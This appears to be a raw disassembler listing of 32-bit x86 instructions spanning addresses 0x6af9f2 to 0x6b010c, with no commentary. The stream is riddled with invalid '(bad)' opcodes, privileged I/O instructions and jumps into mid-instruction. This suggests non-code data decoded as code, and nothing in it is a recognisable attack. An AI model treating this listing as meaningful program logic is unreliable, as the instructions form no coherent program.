  6af9f2:	cmp    eax,0x70c4f537
  6af9f7:	sub    DWORD PTR [ecx],0x15
  6af9fa:	lds    ebp,FWORD PTR [eax]
  6af9fc:	pop    edx
  6af9fd:	scas   eax,DWORD PTR es:[edi]
  6af9fe:	jp     0x6afa0e
  6afa00:	ret    0xcd01
  6afa03:	hlt    
  6afa04:	pop    ecx
  6afa05:	ins    DWORD PTR es:[edi],dx
  6afa06:	int3   
  6afa07:	mov    ah,0xd8
  6afa09:	dec    ebp
  6afa0a:	pop    ecx
  6afa0b:	retf   0xd0e8
  6afa0e:	sar    DWORD PTR [edi-0x27],cl
  6afa11:	aam    0x95
  6afa13:	pop    ebx
  6afa14:	arpl   WORD PTR [ecx-0x2caec8cc],di
  6afa1a:	fiadd  DWORD PTR [edx-0x7d]
  6afa1d:	xchg   esp,eax
  6afa1e:	sub    ecx,DWORD PTR [esi+0x1]
  6afa21:	pop    edi
  6afa22:	fadd   QWORD PTR [ebp+0x18]
  6afa25:	and    DWORD PTR [edi],ebx
  6afa27:	xchg   esi,eax
  6afa28:	arpl   sp,si
  6afa2a:	lea    ebp,[esp+ecx*8]
  6afa2d:	mov    ebp,0x6bcca5a4
  6afa32:	push   cs
  6afa33:	fistp  DWORD PTR [bp+di]
  6afa36:	xor    bl,dh
  6afa38:	(bad)  
  6afa39:	pop    edi
  6afa3a:	retf   0x2618
  6afa3d:	ret    
  6afa3e:	or     eax,0x4497703a
  6afa43:	xchg   ebx,ebp
  6afa45:	je     0x6afa74
  6afa47:	inc    esp
  6afa48:	ror    BYTE PTR [esi+0x76],0xa7
  6afa4c:	xor    ebx,0x18a79d9e
  6afa52:	fwait
  6afa53:	(bad)  
  6afa54:	cmp    eax,0xe9daeea4
  6afa59:	push   ss
  6afa5a:	inc    eax
  6afa5b:	ja     0x6af9fb
  6afa5d:	mov    bl,0x8b
  6afa5f:	inc    ecx
  6afa60:	scas   eax,DWORD PTR es:[edi]
  6afa61:	clc    
  6afa62:	test   al,0xa7
  6afa64:	lea    edx,[edx]
  6afa66:	icebp  
  6afa67:	imul   ecx,DWORD PTR [esi+0x384de4a7],0xffffff9e
  6afa6e:	dec    ebx
  6afa6f:	dec    edx
  6afa70:	xor    DWORD PTR [esi-0x27],edx
  6afa73:	sti    
  6afa74:	push   ss
  6afa75:	mov    ecx,0x1065bb4d
  6afa7a:	pusha  
  6afa7b:	icebp  
  6afa7c:	fstp   TBYTE PTR [ebx-0x36]
  6afa7f:	mov    dh,0x5c
  6afa81:	jbe    0x6afa5d
  6afa83:	add    al,0xb9
  6afa85:	push   ss
  6afa86:	jp     0x6afa9b
  6afa88:	test   BYTE PTR [ebx+esi*1+0x164f2f59],dl
  6afa8f:	add    ebp,DWORD PTR [eax+edx*2]
  6afa92:	imul   DWORD PTR ds:0x901f6b43
  6afa98:	outs   dx,BYTE PTR ds:[esi]
  6afa99:	inc    ecx
  6afa9a:	push   esp
  6afa9b:	dec    edx
  6afa9c:	ret    0x7840
  6afa9f:	add    ecx,DWORD PTR [ecx]
  6afaa1:	and    DWORD PTR [ebx+0x32],0xe0b509a9
  6afaa8:	test   cl,0xb7
  6afaab:	adc    bl,BYTE PTR [ebp-0x7066178d]
  6afab1:	inc    ebp
  6afab2:	retf   0x6767
  6afab5:	ds jecxz 0x6afaed
  6afab8:	add    al,0xba
  6afaba:	dec    esp
  6afabb:	xchg   ebp,eax
  6afabc:	mov    dh,0xe
  6afabe:	retf   0x52a6
  6afac1:	xchg   ebx,eax
  6afac2:	mov    dh,0x93
  6afac4:	fst    QWORD PTR [esi+0x1a]
  6afac7:	push   edx
  6afac8:	sub    eax,DWORD PTR [ecx-0xd]
  6afacb:	sub    BYTE PTR ss:[eiz*8-0x6b03d21a],dh
  6afad3:	cmc    
  6afad4:	or     edi,DWORD PTR [eax+edi*8-0x3c81d8e5]
  6afadb:	add    dl,bl
  6afadd:	and    al,cl
  6afadf:	sub    DWORD PTR [edx+0x78],esp
  6afae2:	pusha  
  6afae3:	gs jmp 0x6afb04
  6afae6:	loope  0x6afa7d
  6afae8:	mov    ecx,0x61c2c394
  6afaed:	pop    es
  6afaee:	mov    dl,BYTE PTR [ebx-0x104ea861]
  6afaf4:	in     eax,0xa9
  6afaf6:	lock and DWORD PTR gs:[ebx],ebp
  6afafa:	shl    DWORD PTR [ebx],cl
  6afafc:	dec    edi
  6afafd:	shl    BYTE PTR [edi],1
  6afaff:	sar    DWORD PTR [eax],cl
  6afb01:	inc    ebp
  6afb02:	pop    esi
  6afb03:	in     al,dx
  6afb04:	mov    dl,0xe5
  6afb06:	sar    esp,1
  6afb08:	jle    0x6afb0c
  6afb0a:	jae    0x6afaf1
  6afb0c:	sub    DWORD PTR [ecx],ebx
  6afb0e:	fs dec eax
  6afb10:	xor    DWORD PTR [edx],esp
  6afb12:	mov    edx,0x7c60bb4a
  6afb17:	in     eax,dx
  6afb18:	cdq    
  6afb19:	sbb    eax,0x61ac63a7
  6afb1e:	xor    DWORD PTR [eax],0x8333bd67
  6afb24:	or     ebx,esi
  6afb26:	lds    ebp,FWORD PTR [eax+0xe]
  6afb29:	ins    BYTE PTR es:[edi],dx
  6afb2a:	les    edx,FWORD PTR [eax-0x3a]
  6afb2d:	mov    esi,0xcf6293ba
  6afb32:	dec    edx
  6afb33:	push   cs
  6afb34:	call   0xaea10676
  6afb39:	dec    ecx
  6afb3a:	mov    al,0xe9
  6afb3c:	iret   
  6afb3d:	rol    DWORD PTR [ecx-0x13a06b0],cl
  6afb43:	(bad)  
  6afb44:	ins    BYTE PTR es:[edi],dx
  6afb45:	jns    0x6afafb
  6afb47:	outs   dx,BYTE PTR ds:[esi]
  6afb48:	and    DWORD PTR [ecx],esi
  6afb4a:	mov    ch,cl
  6afb4c:	sub    al,0xd3
  6afb4e:	sbb    eax,0x5aa02fd
  6afb53:	pusha  
  6afb54:	inc    edx
  6afb55:	jo     0x6afb5e
  6afb57:	jb     0x6afb17
  6afb59:	icebp  
  6afb5a:	xchg   edx,eax
  6afb5b:	adc    BYTE PTR [ebx],dl
  6afb5d:	jecxz  0x6afb52
  6afb5f:	mov    al,0xd4
  6afb61:	pop    ss
  6afb62:	hlt    
  6afb63:	stc    
  6afb64:	arpl   WORD PTR [ebx-0x3d],ax
  6afb67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6afb68:	cli    
  6afb69:	fwait
  6afb6a:	add    DWORD PTR [edi+0x59],edi
  6afb6d:	stc    
  6afb6e:	xchg   edi,eax
  6afb6f:	add    BYTE PTR [eax+0x17],dl
  6afb72:	or     edi,DWORD PTR [eax-0x38]
  6afb75:	clc    
  6afb76:	and    eax,0xde1172a
  6afb7b:	cwde   
  6afb7c:	push   es
  6afb7d:	inc    ebp
  6afb7e:	pop    ds
  6afb7f:	cmp    DWORD PTR [ecx+0x39b1767a],ebp
  6afb85:	int    0x79
  6afb87:	(bad)  
  6afb88:	dec    BYTE PTR [edx+ecx*8-0x63cc32f2]
  6afb8f:	push   es
  6afb90:	sbb    DWORD PTR [edi-0xdfd0a5c],esi
  6afb96:	xchg   edi,eax
  6afb97:	cmc    
  6afb98:	cmc    
  6afb99:	mov    dh,0xf0
  6afb9b:	dec    esi
  6afb9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6afb9d:	jmp    0x6afb8b
  6afb9f:	xchg   DWORD PTR [ebp+0x16964c08],esp
  6afba5:	cmp    DWORD PTR [eax+eiz*4],0x9a50ec43
  6afbac:	(bad)  
  6afbad:	cli    
  6afbae:	xchg   ecx,eax
  6afbaf:	push   eax
  6afbb0:	jle    0x6afb5f
  6afbb2:	stc    
  6afbb3:	rcl    eax,cl
  6afbb5:	add    dh,bh
  6afbb7:	icebp  
  6afbb8:	cmp    DWORD PTR [ebx-0x755229c8],ecx
  6afbbe:	or     eax,DWORD PTR [ebp-0x75]
  6afbc1:	dec    ebp
  6afbc2:	xor    edx,ebx
  6afbc4:	ret    
  6afbc5:	es in  eax,0xd3
  6afbc8:	mov    ds:0x7a45d91,al
  6afbcd:	idiv   BYTE PTR [eax]
  6afbcf:	stos   DWORD PTR es:[edi],eax
  6afbd0:	dec    ebp
  6afbd1:	sbb    dh,cl
  6afbd3:	cmp    al,0x67
  6afbd5:	mov    al,BYTE PTR [ecx+0xd04a1f0]
  6afbdb:	fisubr DWORD PTR [eax+ebp*2+0x51]
  6afbdf:	arpl   WORD PTR [esi-0x681f6ffa],ax
  6afbe5:	sbb    al,BYTE PTR [ebp+0x1a]
  6afbe8:	in     eax,dx
  6afbe9:	mov    cs,WORD PTR [edx-0xf]
  6afbec:	xchg   BYTE PTR [ecx+0x21],dl
  6afbef:	(bad)  
  6afbf0:	sbb    edx,ecx
  6afbf2:	pusha  
  6afbf3:	and    BYTE PTR [ebp+0x2088e98c],dh
  6afbf9:	push   0x6e
  6afbfb:	fs das 
  6afbfd:	mov    WORD PTR [ebx-0x3b],?
  6afc00:	shl    BYTE PTR [eax],0x27
  6afc03:	sub    DWORD PTR [edi+eiz*2],eax
  6afc06:	aas    
  6afc07:	xor    DWORD PTR [ebx+0x77],edi
  6afc0a:	loope  0x6afc6b
  6afc0c:	out    dx,eax
  6afc0d:	mov    cs,WORD PTR [esi+0x6f]
  6afc10:	dec    ebp
  6afc11:	loopne 0x6afc66
  6afc13:	dec    edi
  6afc14:	mov    ?,WORD PTR [edx-0x44]
  6afc17:	push   esi
  6afc18:	inc    ecx
  6afc19:	pop    edx
  6afc1a:	mov    es,esp
  6afc1c:	add    eax,esi
  6afc1e:	js     0x6afc66
  6afc20:	mov    bh,0x5b
  6afc22:	xlat   BYTE PTR ds:[ebx]
  6afc23:	inc    esi
  6afc24:	(bad)  
  6afc25:	mov    dh,0x97
  6afc27:	xor    DWORD PTR [ebx-0xf],edx
  6afc2a:	xor    ecx,DWORD PTR [ecx+edi*1-0x384895d2]
  6afc31:	pop    ss
  6afc32:	ins    BYTE PTR es:[edi],dx
  6afc33:	fldenv [ebx-0x32]
  6afc36:	dec    eax
  6afc37:	mov    ecx,0x92795ae3
  6afc3c:	pop    ds
  6afc3d:	push   ebp
  6afc3e:	sbb    al,0x66
  6afc40:	jae    0x6afc38
  6afc42:	addr16 xor al,0x3c
  6afc45:	leave  
  6afc46:	sub    dl,BYTE PTR [esp+eax*1-0x16]
  6afc4a:	lds    esp,FWORD PTR [eax]
  6afc4c:	xor    ax,0xeed5
  6afc50:	cli    
  6afc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6afc52:	bound  esi,QWORD PTR [edi]
  6afc54:	cdq    
  6afc55:	icebp  
  6afc56:	cwde   
  6afc57:	out    dx,eax
  6afc58:	xchg   ebp,eax
  6afc59:	shl    DWORD PTR [ebx],cl
  6afc5b:	adc    al,0x89
  6afc5d:	sbb    ch,bh
  6afc5f:	sti    
  6afc60:	mov    fs:0xcbb9ba55,al
  6afc66:	popa   
  6afc67:	push   0xd2c7b2ee
  6afc6c:	int    0x2d
  6afc6e:	sub    al,0xfa
  6afc70:	loop   0x6afc35
  6afc72:	jno    0x6afca3
  6afc74:	push   esi
  6afc75:	dec    dl
  6afc77:	inc    ecx
  6afc78:	into   
  6afc79:	push   ecx
  6afc7a:	sub    DWORD PTR [esi],ecx
  6afc7c:	ja     0x6afcf2
  6afc7e:	(bad)  
  6afc7f:	mov    dh,BYTE PTR fs:[edi-0x7801ff4]
  6afc86:	lock fld QWORD PTR [ebx]
  6afc89:	das    
  6afc8a:	push   cs
  6afc8b:	inc    ecx
  6afc8c:	fld    st(6)
  6afc8e:	and    eax,0x70bda39e
  6afc93:	jno    0x6afca3
  6afc95:	stc    
  6afc96:	out    dx,al
  6afc97:	dec    esi
  6afc98:	popa   
  6afc99:	or     ah,BYTE PTR [ecx]
  6afc9b:	fisub  WORD PTR [ecx-0x63]
  6afc9e:	mov    ebp,0x439c0ce1
  6afca3:	(bad)  
  6afca4:	repz retf 
  6afca6:	adc    BYTE PTR [eax+0x69],dh
  6afca9:	enter  0x49fb,0x2a
  6afcad:	xchg   esp,eax
  6afcae:	in     eax,0x2a
  6afcb0:	or     ecx,DWORD PTR [edx+0x2e46e336]
  6afcb6:	add    DWORD PTR [eax+0x726accce],eax
  6afcbc:	inc    ecx
  6afcbd:	xor    dh,BYTE PTR [edi+0x3b]
  6afcc0:	fiadd  WORD PTR [esi+0x5d]
  6afcc3:	or     eax,0x59eb60b9
  6afcc8:	add    DWORD PTR [edi+0x2b],0x0
  6afccc:	stos   BYTE PTR es:[edi],al
  6afccd:	div    DWORD PTR [ecx]
  6afccf:	xchg   edx,eax
  6afcd0:	dec    edi
  6afcd1:	mov    edx,0x6bb27a25
  6afcd6:	aaa    
  6afcd7:	cmp    DWORD PTR [edi+0x68348639],ebx
  6afcdd:	mov    BYTE PTR [ecx+0x17],bl
  6afce0:	jp     0x6afce6
  6afce2:	and    DWORD PTR [esi+0x7d85ae53],edx
  6afce8:	or     edi,eax
  6afcea:	ret    0x49
  6afced:	ins    DWORD PTR es:[edi],dx
  6afcee:	repz jnp 0x6afd36
  6afcf1:	push   ebx
  6afcf2:	add    BYTE PTR [esi+0x2f24de9d],ch
  6afcf8:	aam    0x9d
  6afcfa:	jl     0x6afcbf
  6afcfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6afcfd:	test   eax,0x7031068d
  6afd02:	sub    edi,edi
  6afd04:	mov    DWORD PTR [eax+0x7c5cd908],esp
  6afd0a:	cmp    edi,ebp
  6afd0c:	pop    edx
  6afd0d:	push   0xffffffbd
  6afd0f:	push   esi
  6afd10:	iret   
  6afd11:	sbb    esi,DWORD PTR [eax]
  6afd13:	pop    edi
  6afd14:	lea    ebp,[esi+0x29d5d03f]
  6afd1a:	push   esp
  6afd1b:	lock pop ebp
  6afd1d:	shl    DWORD PTR [esi+0x59],0x39
  6afd21:	rol    DWORD PTR [ecx+0x31630bd2],cl
  6afd27:	adc    bh,ah
  6afd29:	in     al,0x44
  6afd2b:	(bad)  
  6afd2c:	ffree  st(7)
  6afd2e:	dec    ecx
  6afd2f:	cmp    eax,0x2cf1325e
  6afd34:	jo     0x6afd52
  6afd36:	fs ret 0xcac5
  6afd3a:	sbb    ecx,ebp
  6afd3c:	adc    ebp,esp
  6afd3e:	mov    ch,0x4
  6afd40:	test   DWORD PTR [ecx-0x36],esi
  6afd43:	rcl    ah,0xd6
  6afd46:	dec    edi
  6afd47:	xchg   edx,eax
  6afd48:	cmp    eax,0xc3676e22
  6afd4d:	retf   
  6afd4e:	sbb    al,0x12
  6afd50:	outs   dx,BYTE PTR ds:[esi]
  6afd51:	js     0x6afd08
  6afd53:	push   esp
  6afd54:	fld    DWORD PTR [eax]
  6afd56:	xchg   esp,eax
  6afd57:	icebp  
  6afd58:	pop    ecx
  6afd59:	cmp    BYTE PTR [ebx+0x67],dl
  6afd5c:	ins    BYTE PTR es:[edi],dx
  6afd5d:	or     ecx,DWORD PTR [eax+0x6a]
  6afd60:	scas   eax,DWORD PTR es:[edi]
  6afd61:	push   0x13
  6afd63:	inc    ebp
  6afd64:	std    
  6afd65:	mov    ds:0x5932487e,eax
  6afd6a:	add    esi,DWORD PTR [ebp-0x15b7fe75]
  6afd70:	sub    DWORD PTR [esi+0x31],esp
  6afd73:	or     eax,0xbcb0a47f
  6afd78:	pop    ecx
  6afd79:	add    BYTE PTR [ebx-0x4cde8f46],dh
  6afd7f:	adc    eax,0x687a0b5a
  6afd84:	out    dx,eax
  6afd85:	int    0x60
  6afd87:	inc    ebx
  6afd88:	xchg   edx,eax
  6afd89:	sar    bh,1
  6afd8b:	les    esi,FWORD PTR [ebp+edi*1+0x69]
  6afd8f:	cwde   
  6afd90:	cmp    edx,DWORD PTR [ecx+ecx*4]
  6afd93:	fisttp WORD PTR [eax-0x73]
  6afd96:	les    ebp,FWORD PTR [edx]
  6afd98:	mov    edx,0x5278eee7
  6afd9d:	mov    BYTE PTR [edx+0x1464e66e],al
  6afda3:	inc    esi
  6afda4:	retf   0xf5b9
  6afda7:	sar    DWORD PTR [ebp-0x760c5944],0x6f
  6afdae:	pop    edi
  6afdaf:	cmp    edi,0xffffffc5
  6afdb2:	lahf   
  6afdb3:	dec    esi
  6afdb4:	xchg   edi,eax
  6afdb5:	sub    ebp,eax
  6afdb7:	sbb    DWORD PTR [edx-0x4a],0xad48d444
  6afdbe:	call   0xf43e6813
  6afdc3:	loope  0x6afd51
  6afdc5:	push   esp
  6afdc6:	icebp  
  6afdc7:	sbb    al,0x64
  6afdc9:	dec    edi
  6afdca:	mov    dh,0xc9
  6afdcc:	mov    ch,0xa6
  6afdce:	leave  
  6afdcf:	sti    
  6afdd0:	mov    al,ds:0xf9fe75b0
  6afdd5:	pushf  
  6afdd6:	sbb    BYTE PTR [ecx+eax*4+0x62],cl
  6afdda:	fist   DWORD PTR [esi+0x68]
  6afddd:	add    eax,edx
  6afddf:	adc    esi,DWORD PTR [esi+0x62501fb6]
  6afde5:	push   edi
  6afde6:	pop    esi
  6afde7:	sbb    DWORD PTR ds:0x5e01b08e,eax
  6afded:	test   eax,0xa704f0de
  6afdf2:	mov    ecx,0xe5948890
  6afdf7:	sahf   
  6afdf8:	add    eax,0x33a9199e
  6afdfd:	loop   0x6afe7a
  6afdff:	mov    cl,dh
  6afe01:	mov    DWORD PTR [ebx-0x2adf0475],edi
  6afe07:	daa    
  6afe08:	mov    ecx,0xf9fe9eec
  6afe0d:	test   DWORD PTR [ebx-0x28],ebx
  6afe10:	outs   dx,DWORD PTR ds:[esi]
  6afe11:	cmp    eax,0x8a747553
  6afe16:	sahf   
  6afe17:	mul    BYTE PTR [esi+0x599fa41d]
  6afe1d:	mov    al,gs:0x85eff9f
  6afe23:	adc    BYTE PTR [esi],0x89
  6afe26:	xlat   BYTE PTR ds:[ebx]
  6afe27:	aam    0xe9
  6afe29:	mov    ds:0xaeda789f,al
  6afe2e:	adc    edi,DWORD PTR [esi+ebp*4]
  6afe31:	jno    0x6afe9c
  6afe33:	jg     0x6afe14
  6afe35:	loope  0x6afe6e
  6afe37:	xlat   BYTE PTR ds:[ebx]
  6afe38:	push   0x3e
  6afe3a:	inc    edi
  6afe3b:	stos   DWORD PTR es:[edi],eax
  6afe3c:	pushf  
  6afe3d:	rol    DWORD PTR [edi-0x3ba0e200],0x42
  6afe44:	push   edi
  6afe45:	or     al,0xcb
  6afe47:	fs jno 0x6afe86
  6afe4a:	sbb    DWORD PTR [esi+eax*4+0x72636552],edx
  6afe51:	je     0x6afe79
  6afe53:	or     BYTE PTR [eax+edx*8-0x61b1d1db],0x0
  6afe5b:	ins    BYTE PTR es:[edi],dx
  6afe5c:	cmp    ebx,DWORD PTR [ebx-0x27]
  6afe5f:	cdq    
  6afe60:	call   0xea8d:0x9e606d1f
  6afe67:	retf   
  6afe68:	inc    esi
  6afe69:	bound  edi,QWORD PTR [edx+eax*4-0x6e767f35]
  6afe70:	pusha  
  6afe71:	or     eax,0xdca187a5
  6afe76:	arpl   WORD PTR [eax-0x76],cx
  6afe79:	lods   eax,DWORD PTR ds:[esi]
  6afe7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6afe7b:	adc    eax,0x1df0ad3
  6afe80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6afe81:	or     al,BYTE PTR [edx+0x18]
  6afe84:	push   edi
  6afe85:	add    DWORD PTR [esi+0x3feb5f5a],ebx
  6afe8b:	stos   BYTE PTR es:[edi],al
  6afe8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6afe8d:	icebp  
  6afe8e:	icebp  
  6afe8f:	repnz ds aam 0xc4
  6afe93:	cmp    eax,0xe7b06f27
  6afe98:	lock add ah,BYTE PTR [edi+ebx*1]
  6afe9c:	jg     0x6afeeb
  6afe9e:	mov    dl,0x3e
  6afea0:	push   esp
  6afea1:	mov    DWORD PTR [esi+0x33],ebx
  6afea4:	dec    edx
  6afea5:	into   
  6afea6:	rcl    BYTE PTR [edx+0x46],cl
  6afea9:	test   DWORD PTR [edx],edi
  6afeab:	mov    eax,0xdf27018d
  6afeb0:	ds xchg cl,bl
  6afeb3:	(bad)  
  6afeb5:	or     eax,0xeeb68d6e
  6afeba:	pop    es
  6afebb:	and    esp,ecx
  6afebd:	mov    cl,0xb3
  6afebf:	bound  ebx,QWORD PTR [edi+0x53]
  6afec2:	add    BYTE PTR [ecx+edx*2-0x6e047266],bh
  6afec9:	out    dx,eax
  6afeca:	daa    
  6afecb:	mov    cl,0xfd
  6afecd:	inc    edi
  6afece:	jmp    0xf9a00bfa
  6afed3:	add    eax,0x1c206f99
  6afed8:	dec    ebp
  6afed9:	enter  0x2405,0x61
  6afedd:	mov    ?,ecx
  6afedf:	push   esp
  6afee0:	sub    ecx,ecx
  6afee2:	jae    0x6aff16
  6afee4:	push   esi
  6afee5:	mov    ebp,0xd3913975
  6afeea:	jg     0x6aff24
  6afeec:	fsub   DWORD PTR [edx]
  6afeee:	fadd   st(6),st
  6afef0:	mov    cl,0x2f
  6afef2:	ret    
  6afef3:	popa   
  6afef4:	xchg   ecx,eax
  6afef5:	dec    ecx
  6afef6:	inc    eax
  6afef7:	mov    edx,0xe6f053f7
  6afefc:	jne    0x6aff1e
  6afefe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6afeff:	fsubp  st(1),st
  6aff01:	test   eax,0xad4ca4e4
  6aff06:	sub    BYTE PTR [eax-0x6d],ch
  6aff09:	mov    cs,WORD PTR [edx-0x5c]
  6aff0c:	adc    eax,0xfbfb4d49
  6aff11:	mov    edx,0x429c1a62
  6aff16:	cwde   
  6aff17:	ret    0x301b
  6aff1a:	repz xchg edi,eax
  6aff1c:	fisttp DWORD PTR [ebx+0x58]
  6aff1f:	int    0xd9
  6aff21:	mov    DWORD PTR [ebx-0x1f],eax
  6aff24:	add    DWORD PTR [ebx-0x1c4118df],eax
  6aff2a:	pushf  
  6aff2b:	inc    eax
  6aff2c:	xchg   ecx,eax
  6aff2d:	mov    al,0x46
  6aff2f:	in     eax,0xc0
  6aff31:	sbb    al,0x7f
  6aff33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aff34:	mov    dh,0xc9
  6aff36:	cdq    
  6aff37:	dec    edx
  6aff38:	xor    BYTE PTR [esi-0x59],ah
  6aff3b:	xchg   ebp,eax
  6aff3c:	jne    0x6aff39
  6aff3e:	adc    al,0xf8
  6aff40:	mov    dh,0x46
  6aff42:	mov    ah,0x26
  6aff44:	add    DWORD PTR [ecx],esi
  6aff46:	cmc    
  6aff47:	js     0x6aff34
  6aff49:	pop    ds
  6aff4a:	sbb    dh,BYTE PTR [eax]
  6aff4c:	outs   dx,BYTE PTR ds:[esi]
  6aff4d:	loopne 0x6aff06
  6aff4f:	mov    al,0x6c
  6aff51:	inc    edx
  6aff52:	rcr    DWORD PTR [ebx-0x4a],0x4d
  6aff56:	(bad)  
  6aff57:	fidiv  DWORD PTR ds:0xf53393ee
  6aff5d:	(bad)  
  6aff5e:	mov    edx,0xf1d03382
  6aff63:	adc    edx,DWORD PTR [ebp-0x5d0d97d0]
  6aff69:	push   edx
  6aff6a:	imul   ebx,DWORD PTR [ebx+0x78],0xcec8139f
  6aff71:	mov    ds:0x3e13d63e,al
  6aff76:	mov    al,0x6
  6aff78:	dec    ebp
  6aff79:	jge    0x6affc2
  6aff7b:	inc    ebx
  6aff7c:	push   edi
  6aff7d:	retf   0x7315
  6aff80:	and    DWORD PTR [eax],esi
  6aff82:	jge    0x6aff5c
  6aff84:	pushf  
  6aff85:	sbb    al,0x71
  6aff87:	sub    dh,dl
  6aff89:	out    0xc9,al
  6aff8b:	add    cl,BYTE PTR [ebx-0x22]
  6aff8e:	pop    edx
  6aff8f:	jo     0x6affe7
  6aff91:	or     BYTE PTR [ebx-0x72],bh
  6aff94:	mov    dh,0x3a
  6aff96:	ror    DWORD PTR ds:0x9232d688,1
  6aff9c:	add    cl,BYTE PTR [ecx+edx*4]
  6aff9f:	ret    0x7f94
  6affa2:	push   DWORD PTR [esi]
  6affa4:	inc    eax
  6affa5:	dec    edx
  6affa6:	sub    eax,DWORD PTR [eax-0x191c0897]
  6affac:	fist   DWORD PTR [edx+esi*8-0x7]
  6affb0:	jge    0x6affa8
  6affb2:	(bad)  
  6affb3:	lea    eax,[ecx-0x1e344e00]
  6affb9:	push   cs
  6affba:	and    BYTE PTR [ebx-0x43],dh
  6affbd:	sti    
  6affbe:	push   eax
  6affbf:	and    BYTE PTR [ebx-0x77],ch
  6affc2:	fwait
  6affc3:	not    DWORD PTR [esi-0x9091f2b]
  6affc9:	adc    al,0xff
  6affcb:	adc    BYTE PTR [edx],ch
  6affcd:	test   al,0xf3
  6affcf:	and    ebp,DWORD PTR [ebp+ebp*8-0x10]
  6affd3:	mov    ds:0x4d27d1f9,al
  6affd8:	fild   DWORD PTR [edi-0x684bc5e5]
  6affde:	in     al,0x44
  6affe0:	int3   
  6affe1:	push   es
  6affe2:	adc    bl,BYTE PTR [eax-0x47d98cc9]
  6affe8:	push   ecx
  6affe9:	cs and al,0x8c
  6affec:	xor    DWORD PTR [ecx-0x2f33377a],edx
  6afff2:	mov    ds:0x5ba67d37,eax
  6afff7:	cmp    BYTE PTR ds:0x29d2372a,bl
  6afffd:	scas   eax,DWORD PTR es:[edi]
  6afffe:	push   edx
  6affff:	push   esi
  6b0000:	xchg   ebp,eax
  6b0001:	xchg   ebx,eax
  6b0002:	push   ss
  6b0003:	mov    bh,0x2a
  6b0005:	mov    dh,0x4d
  6b0007:	cmp    al,0x9b
  6b000a:	shl    bl,1
  6b000c:	cmp    eax,0xfc578599
  6b0011:	pop    esi
  6b0012:	fsubp  st(4),st
  6b0014:	shr    BYTE PTR [eax+eiz*8+0x751533fe],1
  6b001b:	(bad)  
  6b001c:	and    al,BYTE PTR [ebp-0x1]
  6b001f:	pop    ebx
  6b0020:	mov    eax,0xe3b469f0
  6b0025:	ret    
  6b0026:	std    
  6b0027:	fst    QWORD PTR [ebp*4+0x46b67213]
  6b002e:	shl    ecx,cl
  6b0030:	and    bh,ch
  6b0032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b0033:	pop    DWORD PTR ds:0x85fa9505
  6b0039:	jp     0x6affe7
  6b003b:	popa   
  6b003c:	(bad)  
  6b003d:	(bad)  ds:0xf8ef797c
  6b0043:	sub    cl,0x1
  6b0046:	push   DWORD PTR [ebx+eiz*4-0x1b]
  6b004a:	arpl   WORD PTR [edx+0x1f32c00],dx
  6b0050:	test   eax,0xbd7bb0b8
  6b0055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b0056:	cli    
  6b0057:	jne    0x6b00c9
  6b0059:	xchg   esi,eax
  6b005a:	jle    0x6b00b6
  6b005c:	mov    es,WORD PTR [ebp+0x1280b37a]
  6b0062:	cmp    edx,DWORD PTR [edi]
  6b0064:	jmp    0x6b004e
  6b0066:	dec    esi
  6b0067:	inc    ebp
  6b0068:	scas   eax,DWORD PTR es:[edi]
  6b0069:	inc    edx
  6b006a:	adc    edx,DWORD PTR [edx-0x30]
  6b006d:	mov    ebp,0xdc9d32af
  6b0072:	stc    
  6b0073:	ss loopne 0x6b005a
  6b0076:	mov    ch,0x41
  6b0078:	and    DWORD PTR [esi+0x48],esi
  6b007b:	jae    0x6b006a
  6b007d:	gs daa 
  6b007f:	jl     0x6b005e
  6b0081:	sbb    al,0xef
  6b0083:	ja     0x6b00de
  6b0085:	ret    
  6b0086:	es in  eax,dx
  6b0088:	mov    ds:0xd6453b96,eax
  6b008d:	mov    esp,0xacd87ce6
  6b0092:	frstor [edx-0x9]
  6b0095:	mov    ah,0x2
  6b0097:	in     al,0xdc
  6b0099:	xor    eax,edi
  6b009b:	or     eax,0x905119c3
  6b00a0:	jecxz  0x6b00e1
  6b00a2:	adc    al,0xac
  6b00a4:	jmp    0x6b00ab
  6b00a6:	in     al,0x9d
  6b00a8:	test   DWORD PTR [esi-0x19],edx
  6b00ab:	inc    edi
  6b00ac:	push   ecx
  6b00ad:	test   al,0x62
  6b00af:	dec    eax
  6b00b0:	ins    BYTE PTR es:[edi],dx
  6b00b1:	(bad)  
  6b00b2:	lods   eax,DWORD PTR ds:[esi]
  6b00b3:	push   0x43
  6b00b5:	sub    DWORD PTR [ecx],ecx
  6b00b7:	or     DWORD PTR [ecx],esi
  6b00b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b00ba:	scas   eax,DWORD PTR es:[edi]
  6b00bb:	ret    
  6b00bc:	fst    QWORD PTR [esi-0xf3735b]
  6b00c2:	pop    edi
  6b00c3:	aam    0x74
  6b00c5:	dec    ecx
  6b00c6:	jb     0x6b00be
  6b00c8:	nop
  6b00c9:	gs xchg edi,eax
  6b00cb:	cmc    
  6b00cc:	pop    ss
  6b00cd:	mov    al,0xac
  6b00cf:	fdivr  DWORD PTR [edi-0x62ee2a74]
  6b00d5:	ret    
  6b00d6:	bound  ecx,QWORD PTR [eax-0x12]
  6b00d9:	xchg   ebx,eax
  6b00da:	dec    ebp
  6b00db:	xor    al,cl
  6b00dd:	repz enter 0xf76a,0x68
  6b00e2:	bound  edx,QWORD PTR [ecx+0x9]
  6b00e5:	mov    ah,0x44
  6b00e7:	aam    0xf4
  6b00e9:	cmp    ah,BYTE PTR [eax+0x56]
  6b00ec:	rol    DWORD PTR [ebp-0x6ac5b402],0x31
  6b00f3:	and    BYTE PTR [edx+0x6b8d907],bl
  6b00f9:	jl     0x6b007e
  6b00fb:	enter  0x3193,0xa8
  6b00ff:	inc    ebp
  6b0101:	ror    DWORD PTR [edi+0x6fc85c09],cl
  6b0107:	mov    ds:0xc766dece,al
  6b010c:	inc    edx
